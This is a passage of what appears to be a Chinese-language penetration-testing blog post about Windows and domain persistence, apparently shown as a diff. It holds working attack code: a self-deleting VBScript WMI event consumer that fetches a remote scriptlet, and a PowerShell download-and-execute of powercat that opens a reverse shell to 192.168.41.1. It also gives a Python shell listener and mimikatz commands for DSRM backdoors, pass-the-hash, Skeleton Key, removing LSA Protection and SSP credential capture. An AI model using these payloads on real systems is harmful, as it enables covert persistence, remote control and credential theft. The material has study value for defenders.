+set asec=getobject(nslink&amp;&#34;ActiveScriptEventConsumer&#34;).spawninstance_   &#39;创建“活动脚本事件消费者”&#39;
+asec.name=&#34;consP1&#34;                                                      &#39;定义消费者的名字&#39;
+asec.scriptingengine=&#34;JScript&#34;                                          &#39;定义脚本语言
+asec.ScriptText=&#34;GetObject(&#34;&#34;script:http://192.168.41.1:8080/pnc.js&#34;&#34;)&#34;
+set asecpath=asec.put_                                                  &#39;注册消费者，返回其链接&#39;
+
+set fcbnd=getobject(nslink&amp;&#34;__FilterToConsumerBinding&#34;).spawninstance_  &#39;创建过滤器和消费者的绑定&#39;
+fcbnd.filter=fltpath.path                                               &#39;指定过滤器&#39;
+fcbnd.consumer=asecpath.path                                            &#39;指定消费者&#39;
+fcbnd.put_                                                              &#39;执行绑定&#39;
+
+dim fso
+set fso = CreateObject(&#34;Scripting.FileSystemObject&#34;)
+evilname=left(wscript.scriptfullname,instrrev(wscript.scriptfullname,&#34;\&#34;)) 
+evilname=evilname&amp; fso.GetFile(Wscript.scriptfullname).name
+fso.DeleteFile(evilname) &#39;vbs删除自己
+</code></pre></td></tr></table>
+</div>
+</div><p>pnc.js -&gt; 服务端恶意脚本。下载powercat.ps1，并使用其返回shell。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="o">&lt;?</span><span class="nx">xml</span> <span class="nx">version</span><span class="o">=</span><span class="s2">&#34;1.0&#34;</span><span class="o">?&gt;</span>
+
+<span class="o">&lt;</span><span class="kr">package</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="nx">component</span> <span class="nx">id</span><span class="o">=</span><span class="s2">&#34;testCalc&#34;</span><span class="o">&gt;</span>
+
+<span class="o">&lt;</span><span class="nx">script</span> <span class="nx">language</span><span class="o">=</span><span class="s2">&#34;JScript&#34;</span><span class="o">&gt;</span>
+
+<span class="kd">var</span> <span class="nx">r</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ActiveXObject</span><span class="p">(</span><span class="s2">&#34;WScript.Shell&#34;</span><span class="p">).</span><span class="nx">Run</span><span class="p">(</span><span class="s2">&#34;powershell IEX (New-Object System.Net.Webclient).DownloadString(&#39;http://192.168.41.1:8080/powercat-master/powercat.ps1&#39;);powercat -c 192.168.41.1 -p 6999 -e cmd&#34;</span><span class="p">);</span> 
+
+<span class="o">&lt;</span><span class="err">/script&gt;</span>
+
+<span class="o">&lt;</span><span class="err">/component&gt;</span>
+<span class="o">&lt;</span><span class="err">/package&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>shell_server.py -&gt; 服务端监听shell的脚本。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">socket</span>
+<span class="kn">import</span> <span class="nn">re</span>
+
+<span class="n">pattern</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;[A-Z]:</span><span class="se">\\</span><span class="s1">.*?&gt;&#39;</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">recv_end</span><span class="p">(</span><span class="n">the_socket</span><span class="p">):</span>
+    <span class="n">total_data</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;&#39;</span>
+    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+            <span class="n">data</span> <span class="o">=</span> <span class="n">the_socket</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+            <span class="c1">#print(data)</span>
+            <span class="k">if</span> <span class="ow">not</span> <span class="n">data</span><span class="p">:</span>
+                <span class="k">raise</span> <span class="ne">ConnectionAbortedError</span>
+            <span class="n">data</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">encoding</span> <span class="o">=</span> <span class="s1">&#39;gbk&#39;</span><span class="p">)</span>
+            <span class="n">total_data</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+            <span class="k">if</span> <span class="n">pattern</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">re</span><span class="o">.</span><span class="n">M</span><span class="p">):</span>
+                <span class="k">break</span>
+            <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">total_data</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
+                <span class="n">last_pair</span> <span class="o">=</span> <span class="n">total_data</span><span class="p">[</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="n">total_data</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+                <span class="k">if</span> <span class="n">pattern</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">last_pair</span><span class="p">,</span> <span class="n">re</span><span class="o">.</span><span class="n">M</span><span class="p">):</span>
+                    <span class="k">break</span>
+    <span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">total_data</span><span class="p">)</span>
+
+<span class="c1"># 建立一个服务端</span>
+<span class="n">server</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+<span class="n">port</span> <span class="o">=</span> <span class="mi">6999</span>
+<span class="n">server</span><span class="o">.</span><span class="n">bind</span><span class="p">((</span><span class="s1">&#39;192.168.41.1&#39;</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span> <span class="c1">#绑定要监听的端口</span>
+<span class="n">server</span><span class="o">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span> <span class="c1">#开始监听 表示可以使用五个链接排队</span>
+<span class="k">while</span> <span class="kc">True</span><span class="p">:</span><span class="c1"># conn就是客户端链接过来而在服务端为期生成的一个链接实例</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;------------Listening on </span><span class="si">{}</span><span class="s1">------------&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">port</span><span class="p">))</span>
+    <span class="n">conn</span><span class="p">,</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">server</span><span class="o">.</span><span class="n">accept</span><span class="p">()</span> <span class="c1">#等待链接,多个链接的时候就会出现问题,其实返回了两个值</span>
+    <span class="nb">print</span><span class="p">(</span><span class="n">conn</span><span class="p">)</span>
+    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">se</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="n">recv_end</span><span class="p">(</span><span class="n">conn</span><span class="p">))</span>
+            <span class="k">if</span> <span class="ow">not</span> <span class="n">se</span><span class="p">:</span>
+                <span class="n">se</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\r\n</span><span class="s1">&#39;</span>
+            <span class="c1">#print(bytes(se, encoding = &#34;utf8&#34;))</span>
+            <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="n">se</span><span class="p">,</span> <span class="n">encoding</span> <span class="o">=</span> <span class="s1">&#39;utf-8&#39;</span><span class="p">))</span> <span class="c1">#然后再发送数据</span>
+        <span class="k">except</span> <span class="ne">BaseException</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+            <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="n">addr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39;:&#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">addr</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">+</span> <span class="s1">&#39;已关闭&#39;</span><span class="p">)</span>
+            <span class="k">break</span>
+    <span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>           <span class="c1"># 关闭连接</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>powercat.ps1 -&gt; powershell版netcat。(<a href="https://github.com/besimorhino/powercat" target="_blank" rel="noopener noreffer">https://github.com/besimorhino/powercat</a>)</p>
+<p>clean.ps1 -&gt; 清除evil3.vbs创建的过滤器、消费者、绑定器。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c">#Filter</span>
+<span class="nb">Get-WMIObject</span> <span class="n">-Namespace</span> <span class="n">root</span><span class="p">\</span><span class="n">Subscription</span> <span class="n">-Class</span> <span class="n">__EventFilter</span> <span class="n">-Filter</span> <span class="s2">&#34;Name=&#39;filtP1&#39;&#34;</span> <span class="p">|</span> <span class="nb">Remove-WmiObject</span> <span class="n">-Verbose</span>
+
+<span class="c">#Consumer</span>
+<span class="nb">Get-WMIObject</span> <span class="n">-Namespace</span> <span class="n">root</span><span class="p">\</span><span class="n">Subscription</span> <span class="n">-Class</span> <span class="n">CommandLineEventConsumer</span> <span class="n">-Filter</span> <span class="s2">&#34;Name=&#39;consP1&#39;&#34;</span> <span class="p">|</span> <span class="nb">Remove-WmiObject</span> <span class="n">-Verbose</span>
+
+<span class="c">#Binding</span>
+<span class="nb">Get-WMIObject</span> <span class="n">-Namespace</span> <span class="n">root</span><span class="p">\</span><span class="n">Subscription</span> <span class="n">-Class</span> <span class="n">__FilterToConsumerBinding</span> <span class="n">-Filter</span> <span class="s2">&#34;__Path LIKE &#39;%filtP1%&#39;&#34;</span> <span class="p">|</span> <span class="nb">Remove-WmiObject</span> <span class="n">-Verbose</span>
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="2-域控后门">2 域控后门</h2>
+<h3 id="21-dsrm-后门">2.1 DSRM 后门</h3>
+<p>DSRM(Directory Services Restore Mode) 是 Windows 域环境中域控制器的安全模式启动选项。每个域控制器有一个<strong>本地管理员</strong>账号(也就是 DSRM 账号)。DSRM 的用途是:允许管理员在域环境出现故障或崩溃时还原、修复、重建活动目录数据库，使域环境的运行恢复正常。在域环境创建初期，DSRM 的密码需要在安装 DC 时设置，且很少会被重置。修改 DSRM 密码最基本的方法是在 DC 上运 ntdsutil 行命令。</p>
+<p>在渗透测试中，可以使用 DSRM 账号对域环境进行持久化操作。如果域控制器的系统版本为 Windows Server 2008，则需要安装 KB96132 补丁才可以使用指定域账号的密码对 DSRM 的密码进行同步。在 Windows Server 2008 以后版本的系统中不需要安装此补丁。如果域控制器的系统版本为 Windows Server 2003，则不能使用该方法进行持久化操作。</p>
+<p>我们知道，每个 DC 都有本地管理员(administrator)账号和密码。DSRM 账号可以作为 DC 的本地管理员用户，通过网络连接 DC，进而控制 DC。</p>
+<p>在 DC 上，DSRM 账号的表现形式是本地的 administrator 用户，也就是说本地 administrator 用户 = DSRM 账号</p>
+<h4 id="211-修改-dsrm-密码的方法">2.1.1 修改 DSRM 密码的方法</h4>
+<ol>
+<li>微软公布了修改DSRM密码的方法。在域控上打开命令行环境，常用命令如下：</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># NTDSUTIL：打开ntdsutil</span>
+<span class="nb">set </span><span class="n">DSRM</span> <span class="n">password</span> <span class="c"># ：修改DSRM的密码</span>
+<span class="n">reset</span> <span class="n">password</span> <span class="n">on</span>  <span class="n">server</span> <span class="n">null</span> <span class="c"># 在当前域控制器上重置DSRM的密码</span>
+<span class="c"># q(第1次)：退出DSRM密码设置模式</span>
+<span class="c"># q(第2次)：退出ntdsutil</span>
+</code></pre></td></tr></table>
+</div>
+</div><ol start="2">
+<li>如果域控制器的系统版本为 Windows Server 2008(已安装KB961320)及以上，可以将 DSRM 密码同步为已存在的域账号密码。</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">NTDSUTIL</span> <span class="c"># 打开ntdsutil</span>
+<span class="nb">set </span><span class="n">DSRM</span> <span class="n">password</span> <span class="c"># 修改 DSRM 的密码</span>
+<span class="n">sync</span> <span class="n">from</span> <span class="n">domain</span> <span class="n">account</span> <span class="c"># 域用户名字：使DSRM的密码和指定域用户的密码同步</span>
+<span class="c"># q(第1次)  退出DSRM密码设置模式</span>
+<span class="c"># q(第2次)  退出ntdsutil</span>
+</code></pre></td></tr></table>
+</div>
+</div><h4 id="212-设置-dsrm-后门">2.1.2 设置 DSRM 后门</h4>
+<h5 id="2121-直接为-dsrm-设置新密码">2.1.2.1 直接为 DSRM 设置新密码</h5>
+<ol>
+<li>
+<p>为 DSRM 设置新密码，获取 NTLM 哈希值，修改 DSRM 登录方式，使用哈希传递攻击域控</p>
+</li>
+<li>
+<p>查看 SAM 文件中本地管理员 administrator 的 NTLM 哈希值</p>
+</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">privilege</span><span class="p">::</span><span class="n">debug</span>
+<span class="n">token</span><span class="p">::</span><span class="n">elevate</span>
+<span class="n">lsadump</span><span class="p">::</span><span class="n">sam</span>
+</code></pre></td></tr></table>
+</div>
+</div><ol start="3">
+<li>修改 DSRM 的登录方式</li>
+</ol>
+<p>DSRM 有三种登录方式，具体如下：</p>
+<blockquote>
+<p>0：默认值，只有当域控制器重启并进入 DSRM 模式时，才可以使用 DSRM 管理员账号
+1：只有当本地 AD、DS 服务停止时，才可以使用 DSRM 管理员账号登录域控制器
+2：在任何情况下，都可以使用 DSRM 管理员账号登录域控制器</p>
+</blockquote>
+<p>在 Windows Server 2000 以后的版本操作系统中，对 DSRM 使用控制台登录域控制器进行了限制。如果要使用 DSRM 账号通过网络登录域控制器，需要将该值设置为 <code>2</code>。输入如下命令，可以使用 PowerShell 进行更改。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">New-ItemProperty</span> <span class="s2">&#34;hklm:\system\currentcontrolset\control\lsa\&#34;</span> <span class="n">-name</span> <span class="s2">&#34;dsrmadminlogonbehavior&#34;</span> <span class="n">-value</span> <span class="n">2</span> <span class="n">-propertyType</span> <span class="n">DWORD</span>
+</code></pre></td></tr></table>
+</div>
+</div><ol start="4">
+<li>使用本地 administrator 账号哈希传递攻击域控</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">privilege</span><span class="p">::</span><span class="n">debug</span>
+<span class="n">sekurlsa</span><span class="p">::</span><span class="n">pth</span> <span class="p">/</span><span class="n">domain</span><span class="err">:</span><span class="n">DC</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="n">administrator</span> <span class="p">/</span><span class="n">ntlm</span><span class="err">:</span><span class="n">0f0de1776a3bf0f2a29b6f15b6fcba42</span>
+</code></pre></td></tr></table>
+</div>
+</div><h5 id="2122-将-dsrm-的密码同步为一个域用户的已知密码">2.1.2.2 将 DSRM 的密码同步为一个域用户的已知密码</h5>
+<p>其余方法同上。</p>
+<h3 id="22-skeleton-key-万能密码">2.2 Skeleton Key 万能密码</h3>
+<blockquote>
+<p>Skeleton Key 被安装在 64 位的域控服务器上
+支持 Windows Server2003 — Windows Server2012 R2
+能够让所有域用户使用同一个万能密码进行登录
+现有的所有域用户使用原密码仍能继续登录
+重启后失效</p>
+</blockquote>
+<p>使用 Skeleton Key 攻击时，NTLM、Kerberos 两种身份验证方法都会被篡改。 例如，在NTLM身份验证期间，已注入 LSASS 进程中的主密码哈希将不会与SAM数据库进行比较，而将与 Skeleton Key 哈希进行比较，因此，身份验证将成功。</p>
+<p>Kerberos 加密也将降级为不支持 Salt（RC4_HMAC_MD5）的算法，并且从活动目录中检索到的哈希将替换为 Skeleton Key 哈希。 因此，主密码的哈希值将始终在服务器端进行验证，并且两种方法的身份验证都将成功。</p>
+<h4 id="221-在域控上安装-skeleton-key">2.2.1 在域控上安装 Skeleton Key</h4>
+<p>mimikatz 命令：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">privilege</span><span class="p">::</span><span class="n">debug</span>
+<span class="n">misc</span><span class="p">::</span><span class="n">skeleton</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20201208143347.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20201208143347.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20201208143347.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20201208143347.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20201208143347.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20201208143347.png-water_print" /></p>
+<h4 id="222-在域内主机使用-skeleton-key-登录">2.2.2 在域内主机使用 Skeleton Key 登录</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">net</span> <span class="n">use</span> <span class="p">\\</span><span class="n">dc</span><span class="p">.</span><span class="n">pentest</span><span class="p">.</span><span class="n">domain</span> <span class="n">mimikatz</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="n">administrator</span><span class="nv">@pentest</span><span class="p">.</span><span class="n">domain</span>
+<span class="nb">dir </span><span class="p">\\</span><span class="n">DC</span><span class="p">.</span><span class="n">pentest</span><span class="p">.</span><span class="n">domain</span><span class="p">\</span><span class="n">c</span><span class="p">$</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20201208144833.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20201208144833.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20201208144833.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20201208144833.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20201208144833.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20201208144833.png-water_print" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20201208150046.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20201208150046.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20201208150046.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20201208150046.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20201208150046.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20201208150046.png-water_print" /></p>
+<h4 id="223-权限测试">2.2.3 权限测试</h4>
+<ul>
+<li>使用域内不存在的用户 + Skeleton Key 登录
+<ul>
+<li>无法登录</li>
+</ul>
+</li>
+<li>使用域内普通权限用户登录
+<ul>
+<li>使用域内普通权限用户无法访问域控</li>
+</ul>
+</li>
+</ul>
+<p>结论：</p>
+<blockquote>
+<p>Skeleton Key 只是给所有账户添加了一个万能密码，无法修改账户的权限</p>
+</blockquote>
+<h4 id="224-lsa-protection">2.2.4 LSA Protection</h4>
+<p>微软在 2014 年 3 月 12 日添加了 LSA 保护策略，用来防止对进程 <code>lsass.exe</code> 的代码注入，这样一来就无法使用 mimikatz 对 lsass.exe 进行注入，相关操作也会失败。</p>
+<p><strong>适用系统：</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">Windows 8.1
+Windows Server 2012 R2
+</code></pre></td></tr></table>
+</div>
+</div><p>使用 Windows Server 2012 进行测试</p>
+<h5 id="2241-配置-lsa-protection">2.2.4.1 配置 LSA Protection</h5>
+<p>注册表位置：
+<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa</code></p>
+<p>新建 <code>DWORD</code> 值，名称为：<code>RunAsPPL</code> ，数值为十六进制的 <code>00000001</code></p>
+<p>添加完毕后，需要<strong>重启系统</strong></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20201209094344.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20201209094344.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20201209094344.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20201209094344.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20201209094344.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20201209094344.png-water_print" /></p>
+<h5 id="2242-测试-lsa-protection">2.2.4.2 测试 LSA Protection</h5>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20201209095036.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20201209095036.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20201209095036.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20201209095036.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20201209095036.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20201209095036.png-water_print" /></p>
+<h4 id="225-绕过-lsa-protection">2.2.5 绕过 LSA Protection</h4>
+<p>Mimikatz 命令：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">privilege</span><span class="p">::</span><span class="n">debug</span>
+<span class="p">!+</span>
+<span class="p">!</span><span class="n">processprotect</span> <span class="p">/</span><span class="k">process</span><span class="err">:</span><span class="n">lsass</span><span class="p">.</span><span class="n">exe</span> <span class="p">/</span><span class="n">remove</span>
+<span class="n">misc</span><span class="p">::</span><span class="n">skeleton</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20201209095049.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20201209095049.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20201209095049.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20201209095049.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20201209095049.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20201209095049.png-water_print" /></p>
+<h3 id="23-ssp-劫持">2.3 SSP 劫持</h3>
+<p><strong>SSP</strong></p>
+<blockquote>
+<p>SSP (Security Support Provider)，是 windows 操作系统安全机制的提供者。简单的说，SSP 就是 DLL 文件，主要用于 windows 操作系统的身份认证功能，例如 NTLM、 Kerberos、Negotiate、Secure Channel(Schannel)、 Digest、Credential(CredSSP)</p>
+</blockquote>
+<p><strong>SSPI</strong></p>
+<blockquote>
+<p>SSPI(Security Support Provider Interface)是 windows 操作系统在执行认证操作时使用的 API 接口。可以说 SSPI 就是 SSP 的 API 接口。</p>
+</blockquote>
+<p><strong>LSA</strong></p>
+<blockquote>
+<p>Local Security Authority，用于身份认证，常见进程为 lsass.exe</p>
+</blockquote>
+<p>如果获得目标系统 system 权限，可以使用该方法进行持久化操作。其主要原理是：LSA(Local Security Authority)用于身份验证。Isass.exe 作为 windows 的系统进程，用于本地安全和登录策略；</p>
+<p>在系统启动时，SSP 将被加载到 lsass.exe 进程中。但是，假如攻击者对 LSA 进行了扩展，自定义了恶意的 DLL 文件在系统启动时将其加载到 lsass.exe 进程中，就能够获取  lsass.exe 进程中的明文密码。这样即使用户更改密码并重新登录，攻击者依然可以获得该账号的新密码。</p>
+<h4 id="231-mimilib-ssp">2.3.1 mimilib SSP</h4>
+<blockquote>
+<p>由于是针对本机的 LSA 进行 Patch，因此本方法只针对在当前机器上登录的用户起作用</p>
+</blockquote>
+<h5 id="2311-通过内存更新留后门临时">2.3.1.1 通过内存更新留后门（临时）</h5>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">privilege</span><span class="p">::</span><span class="n">debug</span>
+<span class="n">misc</span><span class="p">::</span><span class="n">memssp</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20201209135146.png-water_print"
